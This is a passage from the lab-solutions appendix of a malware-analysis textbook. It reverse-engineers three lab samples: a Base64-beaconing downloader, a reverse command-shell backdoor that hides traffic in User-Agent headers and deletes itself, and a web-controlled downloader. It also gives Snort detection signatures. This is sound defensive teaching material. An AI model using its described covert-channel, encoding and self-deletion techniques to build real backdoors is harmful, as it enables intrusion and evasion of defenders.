- en: To figure out the string input, we navigate to the calling function, which is
    actually main. Figure 14-1L shows an overview of main, including the Sleep loop
    and a reference to the downloadNRun function.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-1L: Sleep loop with downloadNRun function*'
  prefs: []
  type: TYPE_NORMAL
- en: 'The function just before the loop labeled sub_4010BB appears to modify the
    string passed into the downloadNRun (0x004011A3) function. The downloadNRun function
    takes two arguments: an input and an output string. Examining sub_4010BB, we see
    that it contains two subroutines, one of which is strlen. The other subroutine
    (0x401000) contains references to the standard Base64'
  prefs: []
  type: TYPE_NORMAL
- en: 'string: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**629**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 143](index-663_1.png)'
  prefs: []
  type: TYPE_IMG
- en: sub_401000, however, is not a standard Base64 encoding function.
  prefs: []
  type: TYPE_NORMAL
- en: Base64 functions will typically have a static reference to an equal sign (=)
    for the cases where it needs to provide padding to the end of a 4-byte character
    block. In many implementations, there will be two references to the =, since the
    last two characters of a 4-byte block can be padding.
  prefs: []
  type: TYPE_NORMAL
- en: Figure 14-2L shows one of the forks where the Base64 encoding function (0x401000)
    may choose either an encoding character or a padding character. The path at the
    right in the figure shows the assignment of a as the padding character, rather
    than the typical =.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-2L: Base64 encoding function (0x401000) with alternative padding*
    Within the main function and immediately prior to the primary (outer) Base64 encoding
    function, we see the functions GetCurrentHwProfileA, GetUserName, sprintf, and
    the strings %c%c:%c%c:%c%c:%c%c:%c%c:%c%c and %s-%s.'
  prefs: []
  type: TYPE_NORMAL
- en: Six bytes from the GUID that are returned by GetCurrentHwProfileA are printed
    in MAC address format (in hexadecimal form with colons between each byte), and
    this becomes the first string in %s-%s. The second string is the username. Thus,
    the underlying string is in the format shown here, with HH
  prefs: []
  type: TYPE_NORMAL
- en: 'representing a hexadecimal byte:'
  prefs: []
  type: TYPE_NORMAL
- en: '*HH*: *HH*: *HH*: *HH*: *HH*: *HH*- *username* We can verify that this is the
    correct format by Base64 decoding the string NDE6NzM6N0U6Mjk6OTM6NTYtSm9obiBTbWl0aAaa,
    which we saw in the initial dynamic analysis run shown in Listing 14-1L. The result
    is 41:73:7E:29:93:56-John Smith\x06\x9a. Remember from earlier that this malware
    uses standard Base64 encoding with the exception of the padding character, for
    which it uses a. The extra characters in the result after “John Smith” come from
    using the standard Base64 decoder, which interprets the aa at the end of the string
    as regular characters instead of identifying them as replacement padding characters.'
  prefs: []
  type: TYPE_NORMAL
- en: Having identified the source of the beacon, let’s see what happens when some
    content is received. Returning to the URLDownloadToCacheFileA function (0x004011A3,
    labeled downloadNRun), we see that the success fork of the function is the command
    CreateProcessA, which takes as a parameter the pathname returned from URLDownloadToCacheFileA.
    Once the malware downloads a file, it simply executes that file and quits.
  prefs: []
  type: TYPE_NORMAL
- en: '**630**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Network Signatures**'
  prefs: []
  type: TYPE_NORMAL
- en: The key static elements to target when analyzing a network signature are the
    colons and the dash that provide padding among the hardware profile bytes and
    the username. However, targeting these elements is challenging because the malware
    applies a layer of Base64 encoding before sending this content onto the network.
    Table 14-1L shows how those characters are translated, as well as the pattern
    to target.
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 14-1L:** Static Pattern Within Base64 Encoding **Original**'
  prefs: []
  type: TYPE_NORMAL
- en: 41**:**
  prefs: []
  type: TYPE_NORMAL
- en: 73**:**
  prefs: []
  type: TYPE_NORMAL
- en: 7E**:**
  prefs: []
  type: TYPE_NORMAL
- en: 29**:**
  prefs: []
  type: TYPE_NORMAL
- en: 93**:**
  prefs: []
  type: TYPE_NORMAL
- en: 56**-**
  prefs: []
  type: TYPE_NORMAL
- en: Joh
  prefs: []
  type: TYPE_NORMAL
- en: n S
  prefs: []
  type: TYPE_NORMAL
- en: mit
  prefs: []
  type: TYPE_NORMAL
- en: h..
  prefs: []
  type: TYPE_NORMAL
- en: '**Encoded**'
  prefs: []
  type: TYPE_NORMAL
- en: NDE**6**
  prefs: []
  type: TYPE_NORMAL
- en: NzM**6**
  prefs: []
  type: TYPE_NORMAL
- en: N0U**6**
  prefs: []
  type: TYPE_NORMAL
- en: Mjk**6**
  prefs: []
  type: TYPE_NORMAL
- en: OTM**6**
  prefs: []
  type: TYPE_NORMAL
- en: NTY**t**
  prefs: []
  type: TYPE_NORMAL
- en: Sm9o
  prefs: []
  type: TYPE_NORMAL
- en: biBT
  prefs: []
  type: TYPE_NORMAL
- en: bWl0
  prefs: []
  type: TYPE_NORMAL
- en: aAaa
  prefs: []
  type: TYPE_NORMAL
- en: Because each colon in the original string is the third character of each triple,
    when encoded using Base64, all of the bits in the fourth character of each quad
    come from the third character. That is why every fourth character under the colons
    is a 6, and because of the use of a dash, the sixth quad will always end with
    a t. Thus, we know that the URI will always be at least 24
  prefs: []
  type: TYPE_NORMAL
- en: characters long with specific locations for the four 6 characters and the t.
    We also know the character set that may be used to represent the rest of the URI,
    and that the download name is a single character that is the same as the end of
    the path.
  prefs: []
  type: TYPE_NORMAL
- en: 'We now have two regular expressions to consider. Here is the first regular
    expression:'
  prefs: []
  type: TYPE_NORMAL
- en: /\/**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}6**[A**
  prefs: []
  type: TYPE_NORMAL
- en: '**-Z0-9a-z+\/]**{3}6**[A-Z0-9a-z+\/]**{3}t(**[A-Z0-9a-z+\/]**{4}){1,}\//'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: 'One of the main elements of this expression is [A-Z0-9a-z+\/], shown in bold,
    which matches any single Base64 character. To better understand the expression,
    we’ll use a Greek omega () to replace this element:'
  prefs: []
  type: TYPE_NORMAL
- en: /\/{3}6{3}6{3}6{3}6{3}6{3}t({4}){1,}\//
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we expand the multiple characters:'
  prefs: []
  type: TYPE_NORMAL
- en: /\/66666t(){1,}\//
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, this representation shows more clearly that the expression captures
    the blocks of four characters ending in 6 and t. This regular expression targets
    the first segment of the URI with the static characters.
  prefs: []
  type: TYPE_NORMAL
- en: 'The second regular expression targets a Base64 expression of at least 25 characters.
    The filename is a single character followed by .png that is the same as the last
    character of the previous segment. The following is the regular expression:'
  prefs: []
  type: TYPE_NORMAL
- en: /\/[A-Z0-9a-z+\/]{24,}\([A-Z0-9a-z+\/]\)\/\1.png/
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**631**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Applying the same clarifying shortcuts used with the previous expression gives
    us this:'
  prefs: []
  type: TYPE_NORMAL
- en: /\/{24,}\(\)\/**\1**.png/
  prefs: []
  type: TYPE_NORMAL
- en: The \1 in this expression refers to the first element captured between the parentheses,
    which is the last Base64 character in the string before the forward slash (/).
  prefs: []
  type: TYPE_NORMAL
- en: 'Now that we have two regular expressions that can identify the patterns produced
    by the malware, we translate each into a Snort signature to detect the malware
    when it produces traffic on the network. The first signature could be as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.1 Colons and
    dash"; urilen:>32; content:"GET|20|/"; depth:5; pcre:"/GET\x20\/[A-Z0-9a-z+\/]
  prefs: []
  type: TYPE_NORMAL
- en: '{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A-Z0-9a-z+\/]{3}6[A'
  prefs: []
  type: TYPE_NORMAL
- en: -Z0-9a-z+\/]{3}t([A-Z0-9a-z+\/]{4}){1,}\//"; sid:20001411; rev:1;) This Snort
    rule includes a content string only for the GET / at the start of the packet,
    but it’s usually better to have a more unique content string for improved packet
    processing. The urilen keyword ensures that the URI is a specific length—in this
    case, greater than 32 characters (which accounts for the additional characters
    beyond the first path segment).
  prefs: []
  type: TYPE_NORMAL
- en: 'Now for the second signature. The Snort rule for this signature could be as
    follows:'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.1.2 Base64 and
    png"; urilen:>32; uricontent:".png"; pcre:"/\/[A-Z0-9a-z+\/]{24,}([A-Z0-9a-z+\
  prefs: []
  type: TYPE_NORMAL
- en: /])\/\1\.png/"; sid:20001412; rev:1;)
  prefs: []
  type: TYPE_NORMAL
- en: This Snort rule searches for the .png content in the regular expression before
    testing the PCRE regular expression in order to improve packet-processing performance.
    It also adds a check for the URI length, which has a known minimum.
  prefs: []
  type: TYPE_NORMAL
- en: In addition to the preceding signatures, we could also target areas like the
    domain name ( *www.practicalmalwareanalysis.com*) and the fact that the malware
    downloads an executable. Combining signatures is often an effective strategy.
    For example, a malware signature that produces regular false positives may still
    be effective if combined with a signature that triggers on an executable download.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 14-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The attacker may find static IP addresses more difficult to manage than domain
    names. Using DNS allows the attacker to deploy his assets to any computer and
    dynamically redirect his bots by changing only a DNS
  prefs: []
  type: TYPE_NORMAL
- en: '**632**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: address. The defender has various options for deploying defenses for both types
    of infrastructure, but for similar reasons, IP addresses can be more difficult
    to deal with than domain names. This fact alone could lead an attacker to choose
    static IP addresses over domains.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware uses the WinINet libraries. One disadvantage of these libraries
    is that a hard-coded User-Agent needs to be provided, and optional headers need
    to be hard-coded if desired. One advantage of the WinINet libraries over the Winsock
    API, for example, is that some elements, such as cookies and caching headers,
    are provided by the OS.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: A string resource section in the PE file contains the URL that is used for command
    and control. The attacker can use the resource section to deploy multiple backdoors
    to multiple command-and-control locations without needing to recompile the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The attacker abuses the HTTP User-Agent field, which should contain the application
    information. The malware creates one thread that encodes outgoing information
    in this field, and another that uses a static field to indicate that it is the
    “receive” side of the channel.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The initial beacon is an encoded command-shell prompt.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: While the attacker encodes outgoing information, he doesn’t encode the incoming
    commands. Also, because the server must distinguish between the two communication
    channels via the static elements of the User-Agent fields, this server dependency
    is apparent and can be targeted with signatures.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: The encoding scheme is Base64, but with a custom alphabet.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: Communication is terminated using the keyword exit. When exiting, the malware
    tries to delete itself.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware is a small, simple backdoor. Its sole purpose is to provide a command-shell
    interface to a remote attacker that won’t be detected by common network signatures
    that watch for outbound command-shell activity. This particular malware is likely
    a throwaway component of an attacker’s toolkit, which is supported by the fact
    that the tool tries to delete itself.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'We begin by performing dynamic analysis on the malware. The malware initially
    sends a beacon with an odd User-Agent string:'
  prefs: []
  type: TYPE_NORMAL
- en: GET /tenfour.html HTTP/1.1
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: (!<e6LJC+xnBq90daDNB+1TDrhG6aWG6p9LC/iNBqsGi2sVgJdqhZXDZoMMomKGoqx
    UE73N9qH0dZltjZ4RhJWUh2XiA6imBriT9/oGoqxmCYsiYG0fonNC1bxJD6pLB/1ndbaS9YXe9710A
    6t/CpVpCq5m7l1LCqR0BrWy'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: 127.0.0.1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Cache-Control: no-cache'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**633**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'A short time later, it sends a second beacon: GET /tenfour.html HTTP/1.1'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: Internet Surf'
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: 127.0.0.1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Cache-Control: no-cache'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*If you see the initial beacon but not the second one, your problem may be
    due to the way* *that you are simulating the server. This particular malware uses
    two threads, each of* *which sends HTTP requests to the same server. If one thread
    fails to get a response, the* *entire process exits. If you rely on Netcat or
    some other simple solution for simulating the* *server, you might get the initial
    beacon, but when the second beacon fails, the first will* *quit, too. In order
    to dynamically analyze this malware, you must use two instances of* *Netcat or
    a robust fake server infrastructure such as INetSim.*'
  prefs: []
  type: TYPE_NORMAL
- en: Multiple trials don’t produce changes in the beacon contents, but modifying
    the host or user will change the initial encoded beacon, giving us a clue that
    the source information for the encoded beacon depends on host-specific information.
  prefs: []
  type: TYPE_NORMAL
- en: Beginning with the networking functions, we see imports for InternetOpenA, InternetOpenUrlA,
    InternetReadFile, and InternetCloseHandle, from the WinINet library. One of the
    arguments to InternetOpenUrlA is the constant 0x80000000\.
  prefs: []
  type: TYPE_NORMAL
- en: 'Looking up the values for the parameter affected, we see that it represents
    the INTERNET_FLAG_RELOAD flag. When set, this flag produces the Cache-Control:
    no-cache line from the initial beacon, which demonstrates the advantage of using
    these higher-level protocols instead of more basic socket calls. Malware that
    uses basic socket calls would need to explicitly include the Cache-Control: no-cache
    string in the code, thereby opening it up to be more easily identified as malware
    and to making mistakes in its attempts to imitate legitimate traffic.'
  prefs: []
  type: TYPE_NORMAL
- en: How are the two beacons related? To answer this question, we create a cross-reference
    graph of all functions that ultimately use the Internet functions, as shown in
    Figure 14-3L.
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, the malware has two distinct and symmetric parts. Examining
    the first call to CreateThread in WinMain, it is clear that the function at 0x4014C0,
    labeled StartAddress, is the starting address of a new thread. The function at
    0x4015CO (labeled s_thread2_start) is also the starting address of a new thread.
  prefs: []
  type: TYPE_NORMAL
- en: Examining StartAddress (0x4014C0), we see that in addition to the s_Internet1
    (0x401750) function, it also calls malloc, PeekNamedPipe, ReadFile, ExitThread,
    Sleep, and another internal function. The function at s_thread2_start (0x4015CO)
    contains a similar structure, with calls to s_Internet2 (0x401800), malloc, WriteFile,
    ExitThread, and Sleep. The function PeekNamedPipe can be used to watch for new
    input on a named pipe. (The stdin and stdout associated with a command shell are
    both named pipes.)
  prefs: []
  type: TYPE_NORMAL
- en: To determine what is being read from or written to by the two threads, we turn
    our attention to WinMain, the source of the threads, as shown in Figure 14-3L.
    We see that before WinMain starts the two threads, it calls the functions CreatePipeA,
    GetCurrentProcess, DuplicateHandle, and CreateProcessA. The function CreateProcessA
    creates a new *cmd.exe* process, and the other functions **634**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 144](index-668_1.png)'
  prefs: []
  type: TYPE_IMG
- en: set up the new process so that the stdin and stdout associated with the command
    process handles are available.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 14-3L: Function graph for functions connected with Internet functions*
    This malware author follows a common pattern for building a reverse command shell.
    The attacker has started a new command shell as its own process, and started independent
    threads to read the input and write the output to the command shell. The StartAddress
    (0x4014C0) thread checks for new inputs from the command shell using PeekNamedPipe,
    and if content exists, it uses ReadFile to read the data. Once this data is read,
    it sends the **1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: content to a remote location using the s_Internet1 (0x401750) function.
  prefs: []
  type: TYPE_NORMAL
- en: The other s_thread2_start (0x4015C0) connects to a remote location using s_Internet2
    (0x401800), and if there is any new input for the command shell, it writes that
    to the command shell input pipe.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s return to the parameters passed to the Internet functions in s_Internet1
    (0x401750) to look for the original sources that make up these parameters. The
    function InternetOpenUrlA takes a URL as a parameter, which we later see passed
    into the function as an argument and copied to a buffer early in the function.
    In the preceding function labeled StartAddress (0x4014C0), we see that the URL
    is also an argument. In fact, as we trace the source of the URL, we must go all
    the way back to the start of WinMain (0x4011C0) and the call to LoadStringA. Examining
    the resource section of the PE file, we see that it has the URL that was used
    for beaconing. In fact, this URL is used similarly for the beacons sent by both
    threads.
  prefs: []
  type: TYPE_NORMAL
- en: We’ve identified one of the arguments to s_Internet1 (0x401750) as the URL.
    The other argument is the User-Agent string. Navigating to s_Internet1
  prefs: []
  type: TYPE_NORMAL
- en: (0x401750), we see the static string (!< at the start of the function. This
    matches the start of the User-Agent string seen in the beacon, but it is concatenated
    with a longer string that is passed in as one of the arguments to s_Internet1
    (0x401750). Just before s_Internet1 (0x401750) is called, an Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**635**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'internal function at 0x40155B takes two input parameters and outputs the primary
    content of the User-Agent string. This encoding function is a custom Base64 variant
    that uses this Base64 string:'
  prefs: []
  type: TYPE_NORMAL
- en: 'WXYZlabcd3fghijko12e456789ABCDEFGHIJKL+/MNOPQRSTUVmn0pqrstuvwxyz When the initial
    beacon string is decoded, the result is as follows: Microsoft Windows XP [Version
    5.1.2600]'
  prefs: []
  type: TYPE_NORMAL
- en: (C) Copyright 1985-2001 Microsoft Corp.
  prefs: []
  type: TYPE_NORMAL
- en: C:\Documents and Settings\user\Desktop>
  prefs: []
  type: TYPE_NORMAL
- en: The other thread uses Internet functions in s_Internet2 (0x401800). As already
    mentioned, s_Internet2 uses the same URL parameter as s_Internet1\.
  prefs: []
  type: TYPE_NORMAL
- en: The User-Agent string in this function is statically defined as the string Internet
    Surf.
  prefs: []
  type: TYPE_NORMAL
- en: The s_thread2_start (0x4015C0) thread, as mentioned earlier, is used to pass
    inputs to the command shell. It also provides a facility for terminating the program
    based on input. If the operator passes the string exit to the malware, the malware
    will then exit. The code block loc_40166B, located in s_thread2_start (0x4015C0),
    contains the reference to the exit string and the strnicmp function that is used
    to test the incoming network content.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*We could also have used dynamic analysis to gain insight into the malware.
    The* *encoding function at 0x40155B could have been identified by the Base64 strings
    it* *contains. By setting a breakpoint at the function in a debugger, we would
    have seen the* *Windows command prompt as an argument prior to encoding. The encoded
    command* *prompt varies a bit based on the specific OS and username, which is
    why we found this* *beacon changing based on the host or user.*'
  prefs: []
  type: TYPE_NORMAL
- en: In summary, each of the two threads handles different ends of the pipes to the
    command shell. The thread with the static User-Agent string gets the input from
    the remote attacker, and the thread with the encoded User-Agent string serves
    as the output for the command shell. This is a clever way for attackers to obfuscate
    their activities and avoid sending command prompts from the compromised server
    in the clear.
  prefs: []
  type: TYPE_NORMAL
- en: One piece of evidence that supports the idea that this is a throwaway component
    for an attacker is the fact that the malware tries to delete itself when it exits.
    In WinMain (0x4011C0), there are three possible function end-ings. The two early
    terminations occur when a thread fails to be successfully created. In all three
    terminal cases, there is a call to 0x401880\. The purpose of 0x401880 is to delete
    the malware from disk once the malware exits.
  prefs: []
  type: TYPE_NORMAL
- en: 0x401880 implements the ComSpec method of self-deletion. Essentially, the ComSpec
    method entails running a ShellExecute command with the ComSpec environmental variable
    defined and with the command line
  prefs: []
  type: TYPE_NORMAL
- en: /c del [executable_to_delete] > nul, which is precisely what 0x401880 does.
  prefs: []
  type: TYPE_NORMAL
- en: '**636**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Network Signatures**'
  prefs: []
  type: TYPE_NORMAL
- en: For signatures other than the URL, we target the static User-Agent field, the
    static characters of the encoded User-Agent, and the length and character restrictions
    of the encoded command-shell prompt, as shown in Listing 14-4L.
  prefs: []
  type: TYPE_NORMAL
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.1 Suspicious
    User-Agent (Internet Surf)"; content: "User-Agent\:|20|Internet|20|Surf"; http_header;
    sid:20001421; rev:1;)'
  prefs: []
  type: TYPE_NORMAL
- en: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.2 Suspicious
    User-Agent (starts (!<)"; content: "User-Agent\:|20|(!<"; http_header; sid:20001422;
    rev:1;)'
  prefs: []
  type: TYPE_NORMAL
- en: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"PM14.2.3 Suspicious
    User-Agent (long B64)"; content:"User-Agent\:|20|"; content:!"|20|"; distance:0;
    within:100; pcre:"/User-Agent:\x20[^\x0d]{0,5}[A-Za-z0-9+\/]{100,}/"; sid:20001423;
    rev:1;)
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 14-4L: Snort signatures for Lab 14-2*'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 14-4L, the first two signatures (20001421 and 20001422) are straightforward,
    targeting User-Agent header content that should hopefully be uncommon. The last
    signature (20001423) targets only the length and character restrictions of an
    encoded command-shell prompt, without assuming the existence of the same leading
    characters targeted in 20001422\. Because the signature is looking for a less
    specific pattern, it is more likely to encounter false positives. The PCRE regular
    expression searches for the User-Agent header, followed by a string of at least
    100 characters from the Base64 character set, allowing for up to five characters
    of any value at the start of the User-Agent (as long as they are not line feeds
    indicating a new header). The **1 4**
  prefs: []
  type: TYPE_NORMAL
- en: optional five characters allow a special start to the User-Agent string, such
    as the (!< seen in the malware. The requirement for 100 characters from the Base64
    character set is loosely based on the expected length of a command prompt.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, the negative content search for a space character is purely to increase
    the performance of the signature. Most User-Agent strings will have a space character
    fairly early in the string, so this check will avoid needing to test the regular
    expression for most User-Agent strings.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 14-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The hard-coded headers include Accept, Accept-Language, UA-CPU, Accept-Encoding,
    and User-Agent. The malware author mistakenly adds an additional User-Agent: in
    the actual User-Agent, resulting in a duplicate string: User-Agent: User-Agent:
    Mozilla.... The complete User-Agent header (including the duplicate) makes an
    effective signature.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**637**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Both the domain name and path of the URL are hard-coded only where the configuration
    file is unavailable. Signatures should be made for this hard-coded URL, as well
    as any configuration files observed. However, it would probably be more fruitful
    to target just the hard-coded components than to link them with the more dynamic
    URL. Because the URL
  prefs: []
  type: TYPE_NORMAL
- en: used is stored in a configuration file and can be changed with one of the commands,
    we know that it is ephemeral.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware obtains commands from specific components of a web page from inside
    noscript tags, which is similar to the Comment field example mentioned in the
    chapter. Using this technique, malware can beacon to a legitimate web page and
    receive legitimate content, making analysis of malicious versus legitimate traffic
    more difficult for a defender.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: In order for content to be interpreted as a command, it must include an initial
    noscript tag followed by a full URL (including *http://* ) that contains the same
    domain name being used for the original web page request. The path of that URL
    must end with 96'. Between the domain name and the 96 (which is truncated), two
    sections compose command and arguments (in a form similar to /command/1213141516).
    The first letter of the command must correspond with an allowed command, and,
    when applicable, the argument must be translatable into a meaningful argument
    for the given command.
  prefs: []
  type: TYPE_NORMAL
- en: The malware author limits the strings available to provide clues about the malware
    functionality. When searching for noscript, the malware searches for <no, and
    then verifies the noscript tag with independent and scrambled character comparisons.
    The malware also reuses the same buffer used for the domain to check for command
    content. The other string search for 96' is only three characters, and the only
    other searches are for the / character. When evaluating the command, only the
    first character is considered, so the attacker may, for example, give the malware
    the command to sleep with either the word soft or seller in the web response.
    Traffic analysis might identify the attacker’s use of the word soft to send a
    command to the malware, and that might lead to the mis-guided use of the complete
    word in a signature. The attacker is free to use seller or any other word starting
    with s without modification of the malware.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: There is no encoding for the sleep command; the number represents the number
    of seconds to sleep. For two of the commands, the argument is encoded with a custom,
    albeit simple, encoding that is not Base64\. The argument is presented as an even
    number of digits (once the trailing 96
  prefs: []
  type: TYPE_NORMAL
- en: is removed). Each set of two digits represents the raw number that is an index
    into the array /abcdefghijklmnopqrstuvwxyz0123456789:.. These arguments are used
    only to communicate URLs, so there is no need for capital characters. The advantage
    to this scheme is that it is nonstandard, so we need to reverse-engineer it in
    order to understand its content. The disadvantage is that it is simple. It may
    be identified as suspicious in strings output, and because the URLs always begin
    in the same way, there will be a consistent pattern.
  prefs: []
  type: TYPE_NORMAL
- en: '**638**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware commands include quit, download, sleep, and redirect. The quit command
    simply quits the program. The download command downloads and runs an executable,
    except that, unlike in the previous lab, the attacker can specify the URL from
    which to download. The redirect command modifies the configuration file used by
    the malware so that there is a new beacon URL.
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: This malware is inherently a downloader. It comes with some important advantages,
    such as web-based control and the ability to easily adjust as malicious domains
    are identified and shut down.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: 'Some distinct elements of malware behavior that may be independently targetable
    include the following:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Signatures related to the statically defined domain and path and similar information
    from any dynamically discovered URLs
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Signatures related to the static components of the beacon
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Signatures that identify the initial requirements for a command
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: Signatures that identify specific attributes of command and argument pairs
  prefs: []
  type: TYPE_NORMAL
- en: 9\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for specific signatures.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'Running the malware, we see that it produces the following beacon packet: GET
    /start.htm HTTP/1.1'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept: */*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept-Language: en-US'
  prefs: []
  type: TYPE_NORMAL
- en: 'UA-CPU: x86'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 4**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Accept-Encoding: gzip, deflate'
  prefs: []
  type: TYPE_NORMAL
- en: 'User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;'
  prefs: []
  type: TYPE_NORMAL
- en: .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
  prefs: []
  type: TYPE_NORMAL
- en: 'Host: www.practicalmalwareanalysis.com'
  prefs: []
  type: TYPE_NORMAL
- en: 'Cache-Control: no-cache'
  prefs: []
  type: TYPE_NORMAL
